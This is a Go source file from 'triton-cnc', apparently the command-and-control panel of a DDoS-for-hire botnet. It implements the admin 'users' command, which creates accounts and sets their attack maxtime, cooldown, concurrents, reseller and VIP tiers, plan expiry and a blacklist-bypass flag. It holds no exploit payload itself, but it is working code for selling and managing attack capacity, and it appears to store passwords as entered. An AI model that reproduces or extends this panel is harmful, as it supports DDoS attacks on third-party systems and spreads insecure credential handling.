package user_Command

import (
	"strconv"
	"strings"
	"time"
	"triton-cnc/core/mysql"
	"triton-cnc/core/sessions/commands/users/edit"
	"triton-cnc/core/sessions/commands/users/list"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/client/terminal"
	"triton-cnc/core/models/json/build"
	"triton-cnc/core/models/json/meta"

	"golang.org/x/term"
)


func init() {

	Register(&Command{
		Name: "users",

		Description: "edit user feilds",

		Admin: true,
		Reseller: true,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {



			if len(cmd) < 2 {
				list_users.ListUser(Session)
				return nil
			}

			switch cmd[1] {

			case "create", "add":

				if len(cmd) > 2 {
					Session.Channel.Write([]byte("\x1b[0mNote -> Username should be short and easy to remember!\r\n"))

					Term := term.NewTerminal(Session.Channel, "\x1b[0musername>")
	
					Username, error := Term.ReadLine()
					if error != nil {
						Session.Channel.Write([]byte("\r\n"))
						return nil
					}
	
					Row := database.CheckUser(Username)
					if !Row {
						Session.Channel.Write([]byte("\x1b[0mWarning -> A user already exists with that username!\r\n"))
						return nil
					}
	
					Session.Channel.Write([]byte("Note -> Password should be long and easy to remember but hard to guess!\r\n"))
	
					Term = term.NewTerminal(Session.Channel, "\x1b[0mpassword>")
	
					Password, error := Term.ReadLine()
					if error != nil {
						Session.Channel.Write([]byte("\r\n"))
						return nil
					}

					Preset := GetPreset(cmd[2])
					if Preset == nil {
						Session.Channel.Write([]byte("\x1b[0mWarning -> Plan preset doesn't exist correctly!\r\n"))
						return nil
					}

					added := database.CreateUser(&database.User{
						Username: Username,
						Password: Password,
						NewAccount: true,
						Administrator: Preset.Admin,
						Reseller: Preset.Reseller,
						Vip: Preset.VIP,
						Banned: Preset.Banned,
						Maxtime: Preset.MaxTime,
						Cooldown: Preset.Cooldown,
						Concurrents: Preset.Concurrents,
						MaxSessions: Preset.MaxSessions,
						PowerSavingExempt: Preset.PowerSavingExempt,
						BypassBlacklist: Preset.BypassBlacklist,
						PlanExpiry: time.Now().Add((time.Hour*24)*time.Duration(Preset.DefaultDays)).Unix(),
					})

					if added != nil {
						Session.Channel.Write([]byte("\x1b[38;5;1mWarning -> Failed to correctly add user into database\x1b[0m\r\n"))
						return nil
					}
					Session.Channel.Write([]byte("\x1b[38;5;2mUser has been correctly created and added into sql\x1b[0m\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("\x1b[0mNote -> Username should be short and easy to remember!\r\n"))

				Term := term.NewTerminal(Session.Channel, "\x1b[0musername>")

				Username, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				Row := database.CheckUser(Username)
				if !Row {
					Session.Channel.Write([]byte("\x1b[0mWarning -> A user already exists with that username!\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> Password should be long and easy to remember but hard to guess!\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mpassword>")

				Password, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> MaxTime should be above `0` and below `86400` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mmaxTime>")

				MaxTime, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				MaxTimeINT, error := strconv.Atoi(MaxTime)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> maxTime must be a int\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> Cooldown should be above `0` and below `86400` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mcooldown>")

				Cooldown, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				CooldownINT, error := strconv.Atoi(Cooldown)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> cooldown must be a int\r\n"))
					return nil
				}

				Session.Channel.Write([]byte("Note -> Concurrents should be above `0` and below `9999` !\r\n"))

				Term = term.NewTerminal(Session.Channel, "\x1b[0mconcurrents>")

				Concurrents, error := Term.ReadLine()
				if error != nil {
					Session.Channel.Write([]byte("\r\n"))
					return nil
				}

				ConcurrentsINT, error := strconv.Atoi(Concurrents)
				if error != nil {
					Session.Channel.Write([]byte("Warning -> Concurrents must be a int\r\n"))
					return nil
				}

				

				error = database.CreateUser(&database.User{Username: Username, Password: Password, Maxtime: MaxTimeINT, Cooldown: CooldownINT, Concurrents: ConcurrentsINT, NewAccount: true, Administrator: build.Config.UserDefaults.Admin, Reseller: build.Config.UserDefaults.Reseller, Vip: build.Config.UserDefaults.VIP, Banned: Session.User.Banned, MaxSessions: Session.User.MaxSessions, PowerSavingExempt: Session.User.PowerSavingExempt, BypassBlacklist: Session.User.BypassBlacklist, PlanExpiry: time.Now().Add((time.Hour*24)*time.Duration(build.Config.UserDefaults.DefaultDaysLeft)).Unix()})
				if error != nil {
					Session.Channel.Write([]byte("\x1b[38;5;1mWarning -> Failed to correctly add user into database\x1b[0m\r\n"))
					return nil
				}
				Session.Channel.Write([]byte("\x1b[38;5;2mUser has been correctly created and added into sql\x1b[0m\r\n"))
				return nil
			case "admin=true":
				users_edit.MakeAdmin(Session, cmd)
				return nil

			case "admin=false":
				users_edit.RemoveAdmin(Session, cmd)
				return nil

			case "reseller=false":
				users_edit.RemoveReseller(Session, cmd)
				return nil

			case "reseller=true":
				users_edit.MakeReseller(Session, cmd)
				return nil

			case "vip=false":
				users_edit.Removevip(Session, cmd)
				return nil

			case "vip=true":
				users_edit.Makevip(Session, cmd)
				return nil

			case "ban":
				users_edit.BanUser(Session, cmd)
				return nil

			case "unban":
				users_edit.RevokeBan(Session, cmd)
				return nil

			case "remove":
				users_edit.RemoveAccount(Session, cmd)
				return nil

			case "powersaving=true":
				users_edit.MakePowerSaving(Session, cmd)
				return nil

			case "powersaving=false":
				users_edit.RevokePowerSavingExempt(Session, cmd)
				return nil

			case "bypassblacklist=true":
				users_edit.MakeBypassBlacklist(Session, cmd)
				return nil

			case "bypassblacklist=false":
				users_edit.RevokeBypassBlacklist(Session, cmd)
				return nil


			}

			StringSep := strings.Split(cmd[1], "=")
			if len(StringSep) <= 1 {
				var CommandCSM = map[string]string {
					"sub_command":cmd[1],
				}
				terminal.Banner("sub_command-404", Session.User, Session.Channel, true, false, CommandCSM)
				return nil
			}

			switch StringSep[0] {

			case "maxtime":
				users_edit.AttackTimeChange(Session, cmd, StringSep)
				return nil
			case "cooldown":
				users_edit.CooldownTimeChange(Session, cmd, StringSep)
				return nil
			case "concurrents":
				users_edit.ConcurrentChange(Session, cmd, StringSep)
				return nil

			case "maxsessions":
				users_edit.MaxSessionLimitChange(Session, cmd, StringSep)
				return nil

			case "add_days":
				users_edit.AddDays(Session, cmd, StringSep)
				return nil
			case "add_minutes":
				users_edit.AddMinutes(Session, cmd, StringSep)
				return nil
			}

			var CommandCSM = map[string]string {
				"sub_command":cmd[1],
			}
			terminal.Banner("sub_command-404", Session.User, Session.Channel, true, false, CommandCSM)


			return nil
		},
	})
}

func GetPreset(name string) *meta.Presets {

	for I := 0; I < len(build.PlanPresets.Preset); I++ {
		if name == build.PlanPresets.Preset[I].Name {
			return &build.PlanPresets.Preset[I]
		}
	}

	return nil
}